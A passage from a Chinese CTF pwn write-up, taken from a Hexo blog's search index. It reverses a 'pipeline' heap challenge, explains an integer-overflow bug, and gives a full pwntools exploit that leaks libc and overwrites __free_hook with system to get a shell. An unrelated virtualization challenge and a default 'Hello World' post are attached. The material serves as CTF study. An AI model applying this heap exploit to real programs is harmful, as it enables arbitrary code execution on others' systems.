sub_1391(24); memset(s, 0, 0x18uLL); if ( qword_4058 ) // 首次qword_4058为空，第一次运行后会进行赋值 &#123; v1 = 1; v2 = qword_4058; while ( v2-&gt;next_ptr ) &#123; v2 = v2-&gt;next_ptr; ++v1; &#125; if ( v1 &lt;= 9 ) &#123; result = v2; v2-&gt;next_ptr = s; &#125; else &#123; return sub_1422(s); &#125; &#125; else &#123; result = s; qword_4058 = s; &#125; return result;&#125; edit函数，实际上虽然叫edit函数，确是新建另一个堆的过程： 1234567891011121314151617181920212223242526272829303132struct pipe *sub_16B5()&#123; struct pipe *result; // rax int v1; // [rsp+4h] [rbp-Ch] struct pipe *v2; // [rsp+8h] [rbp-8h] v1 = sub_1540(&quot;index: &quot;); result = sub_1651(v1); v2 = result; if ( result ) &#123; result-&gt;offset = sub_1540(&quot;offset: &quot;); v2-&gt;size = sub_1540(&quot;size: &quot;); v2-&gt;malloc_addr = sub_13CA(v2-&gt;malloc_addr, v2-&gt;size); // realloc if ( v2-&gt;malloc_addr ) // 存储再v2结构体的头8位字节 &#123; if ( v2-&gt;offset &gt;= v2-&gt;size || (result = v2-&gt;offset, result &lt; 0) ) &#123; result = v2; v2-&gt;offset = 0; &#125; &#125; else &#123; v2-&gt;size = 0; v2-&gt;malloc_addr = 0LL; result = v2; v2-&gt;offset = 0; &#125; &#125; return result;&#125; 这里我们来复习一下realloc函数： void *realloc (void *ptr, size_t new_size ); realloc函数用于修改一个原先已经分配的内存块的大小，可以使一块内存的扩大或缩小。当起始空间的地址为空，即*ptr = NULL,则同malloc。当*ptr非空：若nuw_size &lt; size,即缩小*ptr所指向的内存空间，该内存块尾部的部分内存被拿掉，剩余部分内存的原先内容依然保留；若nuw_size &gt; size,即扩大*ptr所指向的内存空间，如果原先的内存尾部有足够的扩大空间，则直接在原先的内存块尾部新增内存，如果原先的内存尾部空间不足，或原先的内存块无法改变大小，realloc将重新分配另一块new_size大小的内存，并把原先那块内存的内容复制到新的内存块上。因此，使用realloc后就应该改用realloc返回的新指针。 实际上这里的堆块结构如下图： 123450x56134a4822b0: 0x0000000000000000 0x00000000000000210x56134a4822c0: 0x0000000000000000 0x0000000000000000 malloc_addr, size offset0x56134a4822d0: 0x000056134a4822e0 0x0000000000000021 next_ptr0x56134a4822e0: 0x0000000000000000 0x00000000000000000x56134a4822f0: 0x000056134a482300 0x0000000000000021 也就是说，当我们add函数申请chunk时，malloc_addr和size、offset是不初始化的。而他们的初始化是在edit函数进行的。后面的append和show函数是对malloc_addr上存储的堆进行操作的，destory函数则是对链式结构堆进行操作的。 回过头来看到初始化函数： 12345678910unsigned int sub_1288()&#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); qword_4050 = (__int64)malloc(0x10uLL); // 第一个申请的堆块地址 *(_QWORD *)qword_4050 = qword_4050 + 16; // 堆中前8位字符存放着qword_4050 + 16 *(_QWORD *)(qword_4050 + 8) = 0x21000LL; // 后8位字符存放着整个内存的大小0x21000 return alarm(0x78u);&#125; checkerr函数，需要保证申请的堆块不能超出初始化的第一个堆块地址到0x21000的范围： 1234567891011unsigned __int64 __fastcall sub_1332(unsigned __int64 a1)&#123; unsigned __int64 result; // rax if ( a1 &lt; *(_QWORD *)qword_4050 || (result = *(_QWORD *)qword_4050 + *(_QWORD *)(qword_4050 + 8), a1 &gt;= result) ) &#123; puts(&quot;error&quot;); exit(0); &#125; return result;&#125; destory函数，只是一个脱链操作，并没有真正的free掉： 1234567891011121314151617181920struct pipe *__fastcall sub_178A(__int64 a1, int a2)&#123; struct pipe *result; // rax unsigned int v3; // [rsp+Ch] [rbp-14h] struct pipe *v4; // [rsp+10h] [rbp-10h] v3 = sub_1540(&quot;index: &quot;); result = sub_1651(v3, a2); // 取第v3个堆块的指针函数，但是要保证链不能断 v4 = result; if ( result ) &#123; if ( result == qword_4058 ) qword_4058 = result-&gt;next_ptr; else sub_1651((v3 - 1), a2)-&gt;next_ptr = result-&gt;next_ptr; // 将next_ptr指针赋值给前一个 sub_1422(v4-&gt;malloc_addr); return sub_1422(v4); &#125; return result;&#125; append函数，这里存在整型溢出，如果v5取一个负数，那么就可以绕过验证，这样就可以扩大v3的值，实现数组溢出： 1234567891011121314151617181920212223242526struct pipe *__fastcall sub_1819(__int64 a1, int a2)&#123; struct pipe *result; // rax int v3; // eax unsigned int v4; // [rsp+10h] [rbp-10h] int v5; // [rsp+14h] [rbp-Ch] struct pipe *v6; // [rsp+18h] [rbp-8h] v4 = sub_1540(&quot;index: &quot;); result = sub_1651(v4, a2); v6 = result; if ( result ) &#123; result = result-&gt;malloc_addr; if ( v6-&gt;malloc_addr ) &#123; v5 = sub_1540(&quot;size: &quot;); printf(&quot;data: &quot;); v3 = v6-&gt;size - v6-&gt;offset; if ( v5 &lt;= v3 ) // 如果要输入的大小小于size - offset，存在整型溢出 LOWORD(v3) = v5; // loword取出低16位 return sub_1453(&amp;v6-&gt;malloc_addr[v6-&gt;offset], v3); // 从offset处继续开始写 &#125; &#125; return result;&#125; show函数： 1234567891011121314151617int __fastcall sub_18B9(__int64 a1, int a2)&#123; struct pipe *v2; // rax unsigned int v4; // [rsp+4h] [rbp-Ch] struct pipe *v5; // [rsp+8h] [rbp-8h] v4 = sub_1540(&quot;index: &quot;); v2 = sub_1651(v4, a2); v5 = v2; if ( v2 ) &#123; v2 = v2-&gt;malloc_addr; if ( v5-&gt;malloc_addr ) LODWORD(v2) = printf(&quot;data: %s\\n&quot;, &amp;v5-&gt;malloc_addr[v5-&gt;offset]); &#125; return v2;&#125; 思路： 由于没有free函数，我们需要使用realloc(0)替代。 先使用edit函数申请一个0x400以上的堆块，free成为unsorted bin后，再申请回来，从而泄露libc地址。 输入一个负数实现数组溢出，这里输入的是-0x7fffff00，在计算机中表示为0x7fffff00的补码，即0x8000100，绕过检测后取低16位，即赋值v3为0x100，可以读入0x100个字符。 数组溢出后可以改写下一个链式结构，包括其malloc_addr地址，最后实现任意地址写，将__free_hook地址改写为system函数地址。 脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, endian = &#x27;little&#x27;)sh = process(&#x27;./pipeline&#x27;)elf = ELF(&#x27;./pipeline&#x27;)libc = elf.libcdef db(): cmd = &#x27;&#x27;&#x27; init-pwndbg &#x27;&#x27;&#x27; gdb.attach(sh, cmd)def choice(cho): sh.sendlineafter(&#x27;&gt;&gt; &#x27;, str(cho))def add(): choice(1)def edit(idx, offset, size): choice(2) sh.sendlineafter(&#x27;index: &#x27;, str(idx)) sh.sendlineafter(&#x27;offset: &#x27;, str(offset)) sh.sendlineafter(&#x27;size: &#x27;, str(size))def destory(idx): choice(3) sh.sendlineafter(&#x27;index: &#x27;, str(idx))def append(idx, size, data): choice(4) sh.sendlineafter(&#x27;index: &#x27;, str(idx)) sh.sendlineafter(&#x27;size: &#x27;, str(size)) sh.sendafter(&#x27;data: &#x27;, data)def show(idx): choice(5) sh.sendlineafter(&#x27;index: &#x27;, str(idx))add() # 0edit(0, 0, 0x1000)add() # 1 防止合并到top chunkedit(0, 0, 0)edit(0, 0, 0x1000) show(0)sh.recvuntil(&#x27;data: &#x27;)libc.address = u64(sh.recvline()[:-1].ljust(8, &#x27;\\x00&#x27;)) - 0x1ebbe0print(hex(libc.address))add() # 2edit(2, 0xff, 0x100)add() # 3edit(3, 0, 0x100)add() # 4edit(4, 0, 0x100)append(4, 0x40, &#x27;/bin/sh\\n&#x27;)append(2, -0x7fffff00, flat([&#x27;a&#x27;, 0, 0x21, libc.sym[&#x27;__free_hook&#x27;], &#x27;\\n&#x27;]))append(3, 0x30, flat([libc.sym[&#x27;system&#x27;], &#x27;\\n&#x27;]))edit(4, 0, 0)sh.interactive() EzCloud 这是一道虚拟化方向的题目，参考链接：https://matshao.com/2021/06/15/QWB2021-Quals-EzCloud/ 12345678910111213141516171819202122232425262728293031323334353637383940414243__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int fd; // [rsp+0h] [rbp-60h] int v5; // [rsp+4h] [rbp-5Ch] unsigned __int64 v6; // [rsp+8h] [rbp-58h] __int64 buf[10]; // [rsp+10h] [rbp-50h] BYREF buf[9] = __readfsqword(0x28u); sub_1463(a1, a2, a3); alarm(0x168u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); fd = open(&quot;/dev/urandom&quot;, 0); if ( fd &gt;= 0 ) &#123; memset(buf, 0, 64); sub_9292(&amp;s2, 64LL, buf); v6 = 0LL; while ( v6 &lt;= 0x3F ) &#123; read(fd, buf, 1uLL); if ( ((*__ctype_b_loc())[SLOBYTE(buf[0])] &amp; 0x1000) != 0 ) *((_BYTE *)s2 + v6++) = buf[0]; &#125; close(fd); ::fd = open(&quot;/dev/NULL&quot;, 1); v5 = fcntl(0, 3, 0LL); if ( v5 &lt; 0 ) &#123; printf(&quot;F_GETFL error&quot;); exit(0); &#125; if ( fcntl(0, 4, v5 | 0x800u) &lt; 0 ) &#123; printf(&quot;F_SETFL error&quot;); exit(0); &#125; while ( 1 ) sub_8BB9(); &#125; return 0xFFFFFFFFLL;&#125;","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"Hello World","slug":"hello-world","date":"2021-10-08T16:34:51.073Z","updated":"1985-10-26T08:15:00.000Z","comments":true,"path":"2021/10/09/hello-world/","link":"","permalink":"http://example.com/2021/10/09/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]}